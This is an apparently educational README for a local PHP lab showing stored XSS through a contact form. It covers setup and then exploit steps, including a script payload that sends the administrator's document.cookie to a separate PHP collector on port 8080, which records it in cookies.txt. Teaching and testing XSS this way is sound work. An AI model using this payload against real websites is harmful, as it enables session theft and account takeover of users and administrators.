# XSS vulnerability
This repository is a simple example of a XSS vulnerability on a PHP website.

This try to represent a tipical contact form on a website, where the user can send a message to the website administrator. The administrator have a page where he can read all the messages sent by the users.

## Setup the lab

### Docker (recommended)
1. Clone the repository

2. Launch the docker container with the following command:

```bash
docker build -t xss-vulnerability .
docker run -p 80:80 --name xss-vulnerability xss-vulnerability
```

3. Open your browser and go to `http://localhost`

### Manual
1. Clone the repository

2. Install PHP

3. Run the following command:

```bash
php -S localhost:80
```

4. Open your browser and go to `http://localhost:80`

## Exploit the vulnerability

1. Open your browser and go to `http://localhost`

2. Lanuch a PHP server with the following command:

```bash
php -S localhost:8080
```
3. Now fill the form with the following payload:

```html
<script> new Image().src="http://localhost:8080/cookie-hijacking.php?cookie="+document.cookie; </script>
```

4. Click on the "Admin" link and you will see the cookie of the administrator in the terminal where you launched the PHP server and in the `cookies.txt` file.